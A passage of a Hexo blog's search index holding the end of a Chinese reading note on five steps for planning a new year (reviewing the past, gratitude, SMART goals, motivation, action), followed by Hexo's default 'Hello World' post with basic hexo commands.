总结过去</h2><p>通过后向思考总结过去，在遗憾中发现机会，以及利用感恩优势培养富足性思维。</p><p>人们都会陷入同样的困境，我们自己也在某种程度上处于这种困境中。除了自我设限性观念，第二个最常见的障碍就是过往的经历。我们把过去绑在身上，就像拖着一辆载满了破旧家具的拖车。因为我们太过受制于过去，所以才不能充分考虑未来。</p><p>如果不愿意承认过去，过去就不会完整。不管我们在过去的岁月里经历过什么，都必须处理这些经历。如果采取无视的态度，不好的事就会重现。如果不寻求解决办法，我们就会把过去遗留下来的东西带到未来，破坏我们对未来的精心设计。</p><p>不管我们有怎么样的过程，只要我们怀着感恩的心看待现在，就会发现我们所拥有的比想象中的要多得多。感恩能够放大生活中的一切美好事物。感恩是能够消除稀缺性思维，培养富足性思维的最好方法。</p><p><em>具体行动计划：</em></p><h3 id="1-事后回顾"><a href="#1-事后回顾" class="headerlink" title="1.事后回顾"></a>1.事后回顾</h3><p>事后回顾四个关键步骤：</p><ul><li>陈述理想结果</li></ul><p>首先问问自己，怎么看待过去的一年。你的计划是什么、梦想是什么，如果你有具体的目标，这些目标又是什么？要清楚自己的感受。</p><ul><li>承认实际结果</li></ul><p>在陈述理想结果时，你可能已经意识到了差距。理想与现实之间总是有距离的，你可能还有一些目标甚至很多目标没有实现。所以问问自己：你在过去的一年中有什么失意或遗憾？悔恨的意义不是让你奢求改变过去，而是让你更好地思考现在。问问自己：在过去的一年中，什么事情让你感到自豪？我们不仅要关注什么事情不成功，还要关注什么事情成功，分析是什么信念或行动带来了这种成功。这种分析对认识自己的力量及总结过去战胜困难的方法具有重要作用，同时也会增加我们对未来的信心。</p><ul><li>从经验中学习</li></ul><p>从经历中提炼经验教训，让经历成为前进的工具。</p><ul><li>调整行为</li></ul><p>如果是你的某种观念或行为造成了理想与实际结果之间的差距，那么是时候做出改变了。</p><h3 id="2-在遗憾中看到机会"><a href="#2-在遗憾中看到机会" class="headerlink" title="2.在遗憾中看到机会"></a>2.在遗憾中看到机会</h3><p>在回答:“你在过去一年中有什么失意或遗憾？”问题时采取积极补救措施的可能性越大，遗憾的感觉就越强烈。所以问问自己，你的遗憾中隐藏着什么机会。</p><h3 id="3-感恩练习"><a href="#3-感恩练习" class="headerlink" title="3.感恩练习"></a>3.感恩练习</h3><p>感恩不是一种情绪，而是一种行动，尝试一下三个练习:早晚自省；通过感激生活的恩赐，练习感恩；记感恩日记。</p><h2 id="STEP-3-设计未来"><a href="#STEP-3-设计未来" class="headerlink" title="STEP 3 设计未来"></a>STEP 3 设计未来</h2><p>学习如何根据SMART目标管理原则建立成就型目标与习惯性目标的最佳组合，以及为什么要在舒适区之外设立目标。</p><p>顺其自然不会本来非凡的成就随波逐流，不能达到想去的终点。我们只能有意识的去思考自己想要什么，为什么想要并根据目标制定行动方案，这一步在帮助我们清理自己的需要创造理想的生活，这也是乐趣的开始。</p><p><em>具体行动计划：</em></p><h3 id="1-设立目标"><a href="#1-设立目标" class="headerlink" title="1.设立目标"></a>1.设立目标</h3><p>每年设立7~10个目标，目标要满足smarter原则:明确性，可衡量性，可行性风险性，定时性，激励性，相关性，根据不同的生活领域制定相应的目标，将目标分散到各个季度，以保证注意力集中以及全年节奏稳定。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/smart1.png" alt="SMART法则" title="SMART法则"></p><h3 id="2-成就型与习惯性目标合理结合"><a href="#2-成就型与习惯性目标合理结合" class="headerlink" title="2.成就型与习惯性目标合理结合"></a>2.成就型与习惯性目标合理结合</h3><p>成就型目标代表一次完成的成就；习惯型目标代表持续且规律的行动。习惯型目标还可以是成就型目标的实现方式。两种类型的目标都对规划最好的一年有所帮助，但是我们要根据个人需求来平衡这两种目标。对我们有用的组合就是正确的组合。</p><h3 id="3-在不适区设立目标"><a href="#3-在不适区设立目标" class="headerlink" title="3.在不适区设立目标"></a>3.在不适区设立目标</h3><p>一个有意义的目标必须让我们提升自己。这就意味着我们必须离开舒适区。如果你明确知道一个目标应该怎么实现，那说明这个目标还太简单了。人生中所有重要的事都发生在舒适区之外。有意义的目标一定是处在不适区的。不适区的目标给我们带来挑战，让我们最大的发挥自己的能力。而恐慌区的目标可能导致失败，带来沮丧和失望。通常的做法是设立一个接近恐慌区的目标，然后再把它稍稍拖回来一些，处在学习区的目标是比较合适的。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/comfortzone.png" alt="舒适区三圈理论" title="舒适区三圈理论"></p><p>最好的是往往发生在我们不得不成长的时候。这在我们对未来一年的规划中是绝对真理，但这违反了我们规避风险的本能，以下4点将有助于我们克服阻力:</p><p>承认走出舒适区的价值。首先转变思维，只要你接受了挑战区的价值，接下来的事就简单多了。</p><p>直面痛苦。大多数阻碍来自我们的内心，但转变思维还不够，通过直面痛苦，我们改变的还有我们的意愿。</p><p>克服恐惧，负面情绪不可避免，不要无视负面情绪，你只需要将实现目标带来的成就感和负面情绪进行对比，是成就多，还是恐惧多？</p><p>避免过度分析。分析瘫痪是真实存在的，你不需要在开头就看到结尾，也不需要知道目标实现的整个过程，你只需要清楚自己下一步应该做什么。</p><h2 id="STEP-4-找到动力"><a href="#STEP-4-找到动力" class="headerlink" title="STEP 4 找到动力"></a>STEP 4 找到动力</h2><p>深入挖掘自己的内在动力，以及防止迷失自己的方法，与朋友同行。</p><p>切记，目标的设定必须明确、易于衡量、有章可循，且无太大风险，节点清晰、振奋人心，并与自己的生活息息相关。识别目标以及动机与目标相关联，给你的目标一个理由。这一点至关重要，因为我们注定会陷入泥沼。无论哪个梦想哪个目标、哪次尝试都逃脱不了这样的命运。我们有时会想，要是有更好的计划，到达终点的路便会少些痛苦、少些风雨。然而，往往事与愿违，要走出困境必须善加利用你的动机，只有这样才能获得动力与毅力，不畏险阻，不言放弃。</p><p><em>具体行动计划：</em></p><h3 id="1-回忆动机"><a href="#1-回忆动机" class="headerlink" title="1.回忆动机"></a>1.回忆动机</h3><p>从识别主要动机入手。你的初衷是什么？它对你来说为什么重要？找个本子，要不就拿出一张纸，一一列出主要动机。只列动机还远远不够，记得给他们排个序，把最好的理由写在前面。最后，用脑子去想，用心去体会。</p><h3 id="2-驾驭动机"><a href="#2-驾驭动机" class="headerlink" title="2.驾驭动机"></a>2.驾驭动机</h3><p>追逐目标的过程中，有4个方法能让我们坚持不懈:</p><p>（1）识别、憧憬未来。最终，事情本身便有了意义。</p><p>（2）要知道新习惯不是几个礼拜就能养成的，没准需要五六个月，所以别期望太高。</p><p>（3）游戏人生，请习惯使用一些养成软件和日历簿帮个忙。</p><p>（4）要衡量所得，而不是差距，珍视每个小的成就。</p><h3 id="3-组建团体"><a href="#3-组建团体" class="headerlink" title="3.组建团体"></a>3.组建团体</h3><p>若是有朋友同行，目标的实现便会容易不少。主动交朋友给了成功4个好处:学习、鼓励、责任、竞争，至少有7种朋友能够帮你成长，帮你实现目标:网络社区，跑步健身社区，交流社区，指导性社交圈，读书学习小组，责任小组，好朋友，若是找不到合适的团体，千万别犹豫，干脆自己建一个吧。</p><h2 id="STEP-5-付诸实践"><a href="#STEP-5-付诸实践" class="headerlink" title="STEP 5 付诸实践"></a>STEP 5 付诸实践</h2><p>规划是基础，行动才是关键。将目标付诸实现，勇于行动，全方位升级！</p><p>伟大并非来自一次冲动，而是由一系列小时汇集而成。确定目标是成功的一半，成功的另一半在于采取行动。</p><p><em>具体行动计划：</em></p><h3 id="1-将总目标分解为可执行的后续步骤"><a href="#1-将总目标分解为可执行的后续步骤" class="headerlink" title="1.将总目标分解为可执行的后续步骤"></a>1.将总目标分解为可执行的后续步骤</h3><p>设立目标在舒适区之外考虑，执行目标从舒适区开始。先完成最简单的任务，遇到困难的时候寻求外界帮助。快速取得初步成功能为后续行动带来动力。</p><h3 id="2-运动触发器"><a href="#2-运动触发器" class="headerlink" title="2.运动触发器"></a>2.运动触发器</h3><p>找到最有效的激活事件。利用杠杆效应，借助简单的任务完成困难的任务。不要依靠自己的即时自控力，通过清除诱惑、自动化、委托授权来优化触发器。</p><p>我们在追求目标的过程中，会遇到干扰事项，所以要预测干扰，预置回应。关键就是在被干扰事项打乱计划之前，先想好应对策略，如果应对策略效果不佳，则调整到满意为止。</p><h3 id="3-安排定期目标回顾"><a href="#3-安排定期目标回顾" class="headerlink" title="3.安排定期目标回顾"></a>3.安排定期目标回顾</h3><p>每日浏览目标列表，确保心中有目标，并在浏览时思考当天的具体任务，也就是“每日三大事”。</p><p>在每周回顾中重点关注主要动机对前一周的任务进展进行一次快速的事后回顾，审查每个目标的后续步骤，并确定接下来一周必须取得的三个成果，也就是“每周三大事”。用“每周三大事”指导“每日三大事”。</p><p>在季度回顾时，建议重新走一遍“5步实现新年目标”流程。重点如下:</p><p>如果已经取得完全或阶段性的胜利，就庆祝自己的胜利；</p><p>如果还没有取得任何形式的胜利，就重新开始追求目标；</p><p>如果不能重新开始，就修改目标；</p><p>如果不能修改，就删除目标；</p><p>用新目标替代被删除的目标。</p><p><em>不要拖着你的梦想。不要拖着你的目标。今日事今日毕，你的生活和工作才能有所起色。一旦下定决心，就行动起来。2020必须是突破的一年！</em></p><hr><center>关注：“爱分享读书”微信公众号 </center><p><img src="http://image.ishareread.com/qrcode_for_gh_70fb5d85a824_258.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><center>读书我们是认真的</center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/16107/"/>
      <url>/posts/16107/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
